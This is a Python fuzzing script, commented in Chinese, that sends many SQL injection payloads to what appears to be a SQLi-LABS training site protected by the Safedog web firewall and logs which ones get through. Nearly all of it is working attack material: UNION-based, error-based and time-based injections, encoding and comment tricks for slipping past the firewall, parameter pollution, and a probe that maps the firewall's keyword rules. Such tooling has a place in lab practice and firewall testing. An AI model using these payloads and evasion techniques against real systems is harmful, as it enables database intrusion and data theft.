#!/usr/bin/env python3
"""
SQLi-LABS WAF Bypass Fuzz Tool
目标: sql.ctfstu.uk:1685/sql
WAF: 安全狗（Safedog）
说明: 系统化 Fuzz 安全狗对各种 SQL 注入技巧的拦截情况
"""

import subprocess
import re
import sys
import time
from urllib.parse import quote

TARGET = "http://sql.ctfstu.uk:1685/sql"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

results = {
    "✅ PASS": [],
    "❌ BLOCKED": [],
    "⚠️ SQL_ERROR": [],
    "❓ OTHER": []
}

def req(url, timeout=8):
    """Send request and return response text"""
    try:
        r = subprocess.run(
            ["/usr/bin/curl", "-s", url, "-H", f"User-Agent: {UA}"],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout
    except:
        return ""

def test(desc, url, show_all=False):
    """Test a payload and categorize the result"""
    resp = req(url)
    
    # Classification
    if "拦截页面" in resp or "安全狗" in resp or "厦门服云" in resp:
        tag = "❌ BLOCKED"
    elif "Your Login name" in resp:
        tag = "✅ PASS"
    elif "You are in" in resp and "Dumb" not in resp:
        tag = "✅ PASS"
    elif "error in your SQL syntax" in resp:
        tag = "⚠️ SQL_ERROR"
    elif "Unknown column" in resp or "Unknown database" in resp or "Unknown table" in resp:
        tag = "⚠️ SQL_ERROR"
    elif "MySQL" in resp and "error" in resp.lower():
        tag = "⚠️ SQL_ERROR"
    else:
        tag = "❓ OTHER"
        if show_all:
            print(f"[RAW: {resp[:100]}]")
    
    results[tag].append(desc)
    
    # Show result inline if selected
    if show_all or tag != "❌ BLOCKED":
        detail = ""
        if "Your Login name" in resp:
            m = re.search(r"Your Login name:([^<]+)<br>Your Password:([^<]+)", resp)
            if m:
                detail = f" -> {m.group(1)}/{m.group(2)}"
        if "error in your SQL syntax" in resp:
            m = re.search(r"near '([^']*)'", resp)
            if m:
                detail = f" -> {m.group(1)[:50]}"
        if "Unknown column" in resp:
            m = re.search(r"Unknown column '([^']*)'", resp)
            if m:
                detail = f" -> {m.group(1)}"
        print(f"  {tag}: {desc}{detail}")
    return resp

def build_url(less, id_val):
    """Build full URL with proper encoding"""
    return f"{TARGET}/Less-{less}/?id={id_val}"

print("""
╔══════════════════════════════════════════════════════════════╗
║      SQLi-LABS 安全狗 WAF Bypass Fuzz                      ║
║      Target: sql.ctfstu.uk:1685/sql                        ║
║      WAF: 安全狗 (Safedog)                                 ║
╚══════════════════════════════════════════════════════════════╝
""")

# =============================================
# PHASE 1: Baseline - Normal & Error Detection
# =============================================
print("\n[Phase 1] 基线测试 - 确认正常/异常行为")
print("-" * 60)

test("Less-1: id=1 (正常)", build_url(1, "1"))
test("Less-1: id=1' (引号报错)", build_url(1, "1'"))
test("Less-2: id=1 (正常数字型)", build_url(2, "1"))
test("Less-3: id=1 (正常)", build_url(3, "1"))
test("Less-3: id=1' (引号报错)", build_url(3, "1'"))
test("Less-4: id=1 (正常双引号)", build_url(4, "1"))
test("Less-5: id=1 (双查询)", build_url(5, "1"))
test("Less-5: id=1' (报错注入)", build_url(5, "1'"))

# =============================================
# PHASE 2: Comment & Space Bypass
# =============================================
print("\n\n[Phase 2] 注释与空格绕过技巧")
print("-" * 60)

less1 = lambda x: build_url(1, x)
less2 = lambda x: build_url(2, x)
less3 = lambda x: build_url(3, x)

# 注释
test("Less-1: -- 注释", less1("1'--+"))
test("Less-1: # 注释", less1("1'%23"))
test("Less-1: /* 注释 */", less1("1'/**/"))

# 空格替换
test("Less-1: %09(Tab)替代空格", less1("1'%091--+"))
test("Less-1: %0a(换行)替代空格", less1("1'%0a--+"))
test("Less-1: %0d(%0a)替代空格", less1("1'%0d%0a--+"))
test("Less-1: %a0(NBSP)替代空格", less1("1'%a0--+"))
test("Less-1: %0b 替代空格", less1("1'%0b--+"))
test("Less-1: %0c 替代空格", less1("1'%0c--+"))
test("Less-1: +(加号)替代空格", less1("1'+-+"))
test("Less-1: `(反引号)替代空格", less1("1'`--+"))

# =============================================
# PHASE 3: Key Word Bypass Techniques
# =============================================
print("\n\n[Phase 3] 关键词绕过技巧")
print("-" * 60)

# --- ORDER BY / GROUP BY ---
print("\n--- ORDER BY / GROUP BY ---")
test("Less-1: order by 3", less1("1' order by 3--+"))
test("Less-1: group by 3", less1("1' group by 3--+"))
test("Less-1: group by 4", less1("1' group by 4--+"))

# --- AND / OR / || ---
print("\n--- AND / OR 逻辑运算 ---")
test("Less-1: %26%26(&&) 1=1", less1("1' %26%26 1=1--+"))
test("Less-1: || 1", less1("1' || 1--+"))
test("Less-1: || '1", less1("1'||'1"))
test("Less-1: OR 1=1", less1("1' OR 1=1--+"))
test("Less-1: ||(1)", less1("1'||(1)--+"))

# --- = 比较运算 ---
print("\n--- 比较运算 ---")
test("Less-1: '='1 (T)", less1("1'='1"))
test("Less-1: '='2 (F)", less1("1'='2"))
test("Less-1: '<'>'1 (<>替代=)", less1("1'%3c%3e'1"))
test("Less-1: LIKE", less1("1' LIKE '1"))
test("Less-1: REGEXP", less1("1' REGEXP '1"))
test("Less-1: IN(1)", less1("1' IN (1)--+"))

# --- UNION SELECT ---
print("\n--- UNION SELECT (核心测试) ---")
test("Less-2(数字型): union select 1,2,3", less2("-1 union select 1,2,3"))
test("Less-2: union/**/select", less2("-1 union/**/select 1,2,3"))
test("Less-2: union%0aselect", less2("-1 union%0aselect 1,2,3"))
test("Less-2: union%09select", less2("-1 union%09select 1,2,3"))
test("Less-2: union%a0select", less2("-1 union%a0select 1,2,3"))
test("Less-2: uni%6fn sel%65ct", less2("-1 uni%6fn sel%65ct 1,2,3"))
test("Less-2: /*!union*/ select", less2("-1 /*!union*/ select 1,2,3"))
test("Less-2: union /*!select*/", less2("-1 union /*!select*/ 1,2,3"))
test("Less-2: ununionion selselectect", less2("-1 ununionion selselectect 1,2,3"))
test("Less-2: UNIoN SELecT 大小写", less2("-1 UNIoN SELecT 1,2,3"))
test("Less-2: union(select(1))", less2("-1 union(select(1),2,3)"))

# Less-3 with twist closing
test("Less-3:') union select 1,2,3", less3("-1') union select 1,2,3--+"))
test("Less-3:') union/**/select", less3("-1') union/**/select 1,2,3--+"))

# =============================================
# PHASE 4: Function Bypass
# =============================================
print("\n\n[Phase 4] 函数与内置变量绕过")
print("-" * 60)

# Built-in functions
print("\n--- 内置函数 ---")
test("Less-1: database()", less1("1'=database()='1"))
test("Less-1: user()", less1("1'=user()='1"))
test("Less-1: version()", less1("1'=version()='1"))
test("Less-1: @@version", less1("1'=@@version='1"))
test("Less-1: @@datadir", less1("1'=@@datadir='1"))
test("Less-1: current_user()", less1("1'=current_user()='1"))

# Error-based functions
print("\n--- 报错函数 ---")
test("Less-5: updatexml", build_url(5, "1' and updatexml(1,concat(0x7e,database()),1)--+"))
test("Less-5: extractvalue", build_url(5, "1' and extractvalue(1,concat(0x7e,database()))--+"))
test("Less-5: floor(rand)", build_url(5, "1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))a from information_schema.tables group by a)b)--+"))

# Time-based functions
print("\n--- 延时函数 ---")
test("Less-1: sleep(3)", less1("1' and sleep(3)--+"))
test("Less-1: benchmark(10000000,md5(1))", less1("1' and benchmark(10000000,md5(1))--+"))

# String functions
print("\n--- 字符串函数 ---")
test("Less-1: substr()", less1("1' and substr('abc',1,1)='a'--+"))
test("Less-1: ascii()", less1("1' and ascii('a')=97--+"))
test("Less-1: ord()", less1("1' and ord('a')=97--+"))
test("Less-1: char()", less1("1' and char(97)='a'--+"))
test("Less-1: hex()", less1("1' and hex('a')='61'--+"))
test("Less-1: unhex()", less1("1' and unhex('61')='a'--+"))
test("Less-1: concat()", less1("1' and concat('a','b')='ab'--+"))
test("Less-1: mid()", less1("1' and mid('abc',1,1)='a'--+"))

# =============================================
# PHASE 5: HTTP Method & Header Bypass
# =============================================
print("\n\n[Phase 5] HTTP 方法与头部绕过")
print("-" * 60)

print("\n--- POST 方式提交 ---")
# Test Less-2 with POST
resp = req(f"{TARGET}/Less-2/", timeout=8)
# POST with body
try:
    r = subprocess.run(
        ["/usr/bin/curl", "-s", f"{TARGET}/Less-2/?id=-1 union select 1,2,3",
         "-H", f"User-Agent: {UA}",
         "-X", "POST", "-d", "x=1"],
        capture_output=True, text=True, timeout=8
    )
    resp2 = r.stdout
    if "拦截页面" in resp2:
        print(f"  ❌ BLOCKED: POST Less-2 union select")
    elif "Your Login name" in resp2:
        print(f"  ✅ PASS: POST Less-2 union select")
    else:
        print(f"  ❓ OTHER: POST Less-2")
except:
    print(f"  ❌ ERROR: POST Less-2")

# Try Content-Type bypass
print("\n--- Content-Type 变换 ---")
for ct in ["text/plain", "application/json", "multipart/form-data", "application/xml"]:
    try:
        r = subprocess.run(
            ["/usr/bin/curl", "-s", f"{TARGET}/Less-2/?id=-1 union select 1,2,3",
             "-H", f"User-Agent: {UA}", "-H", f"Content-Type: {ct}"],
            capture_output=True, text=True, timeout=8
        )
        resp = r.stdout
        if "拦截页面" in resp:
            print(f"  ❌ BLOCKED: Content-Type: {ct}")
        elif "Your Login name" in resp:
            print(f"  ✅ PASS: Content-Type: {ct}")
        else:
            print(f"  ❓ OTHER: Content-Type: {ct}")
    except:
        pass

# =============================================
# PHASE 6: HTTP Parameter Pollution (HPP)
# =============================================
print("\n\n[Phase 6] HTTP 参数污染 (HPP)")
print("-" * 60)

# Double id parameter
test("Less-2: HPP 双id参数", less2("-1 union&id= select 1,2,3--+"))

# =============================================
# PHASE 7: Case & Encoding Tricks
# =============================================
print("\n\n[Phase 7] 大小写与编码组合")
print("-" * 60)

# Double URL encoding
test("Less-1: 双重URL编码 union", less1("1' %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%20%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34--+"))

# MySQL versioned comments
test("Less-2: /*!50000union*/ select", less2("-1 /*!50000union*/ /*!50000select*/ 1,2,3"))
test("Less-2: /*!union*/ ", less2("-1 /*!union*/ /*!select*/ 1,2,3"))

# Random case
test("Less-2: UnIoN sElEcT", less2("-1 UnIoN sElEcT 1,2,3"))

# =============================================
# PHASE 8: Advanced Bypass
# =============================================
print("\n\n[Phase 8] 高级绕过技巧")
print("-" * 60)

# Use @variable
test("Less-1: @变量", less1("1'=@a='1"))
test("Less-2: @变量查询", less2("-1 union select @a,@b,@c"))

# Use INTo OUTFILE/DUMPFILE
test("Less-2: union select into", less2("-1 union select 1,2,3 into @a,@b,@c"))

# Using LEAST/GREATEST instead of comparisons
test("Less-1: GREATEST", less1("1'=greatest(1,1)='1"))

# Using BETWEEN
test("Less-1: BETWEEN", less1("1' between 1 and 1--+"))

# Using STR_TO_DATE or other mysql tricks
test("Less-1: 1'=str_to_date('a','%a')='a", less1("1'=str_to_date('a','%a')='a"))

# MySql {identifier} syntax
test("Less-2: {标识符}", less2("-1 union select {1},{2},{3}"))

# Using : (bind variable placeholder)
test("Less-1: 冒号语法", less1("1':=1--+"))

# Buffer overflow / long string
test("Less-1: 长字符串填充", less1("1'=" + "A"*5000 + "='1"))
test("Less-2: 长字符串绕过union", less2("-1 " + "/*" + "A"*5000 + "*/ union select 1,2,3"))

# Tab/space mixed with comment
test("Less-2: union%09/**/select", less2("-1 union%09/**/select%091,2,3"))

# Backslash escape
test("Less-1: 反斜杠转义", less1("1\\"))

# =============================================
# PHASE 9: WAF Rule Detection (what exactly triggers)
# =============================================
print("\n\n[Phase 9] WAF 规则边界测试 (精确判断触发条件)")
print("-" * 60)

print("\n--- 单个关键词测试 ---")
for word in ["union", "select", "from", "where", "and", "or", "drop", "alter", "insert",
             "update", "delete", "exec", "sleep", "benchmark", "load_file",
             "into", "outfile", "dumpfile", "information_schema",
             "database", "version", "user", "password", "schema",
             "substr", "substring", "mid", "ascii", "char", "hex",
             "concat", "group_concat", "floor", "rand", "count",
             "updatexml", "extractvalue", "name_const", "make_set"]:
    # Test in Less-1 with harmless context
    resp = req(build_url(1, f"1'{word}%201--+"))
    if "拦截页面" in resp:
        results["❌ BLOCKED"].append(f"keyword-single: {word}")
        print(f"  ❌ BLOCKED:  '{word}'")
    elif "Your Login name" in resp:
        results["✅ PASS"].append(f"keyword-single: {word}")
        print(f"  ✅ PASS:     '{word}'")
    else:
        print(f"  ❓ OTHER:    '{word}'")

# =============================================
# SUMMARY
# =============================================
print("\n\n" + "="*60)
print("📊 FUZZ 测试总结")
print("="*60)
print(f"✅ 通过 (PASS):        {len(results['✅ PASS'])}")
for r in results['✅ PASS']:
    print(f"   ✅ {r}")
print(f"\n❌ 被拦截 (BLOCKED):   {len(results['❌ BLOCKED'])}")
for r in results['❌ BLOCKED'][:30]:
    print(f"   ❌ {r}")
if len(results['❌ BLOCKED']) > 30:
    print(f"   ... 还有 {len(results['❌ BLOCKED'])-30} 个")
print(f"\n⚠️ SQL错误 (SQL_ERROR): {len(results['⚠️ SQL_ERROR'])}")
for r in results['⚠️ SQL_ERROR']:
    print(f"   ⚠️ {r}")
print(f"\n❓ 其他 (OTHER):      {len(results['❓ OTHER'])}")
for r in results['❓ OTHER']:
    print(f"   ❓ {r}")

print("\n" + "="*60)
print("报告生成完毕！")
print("="*60)
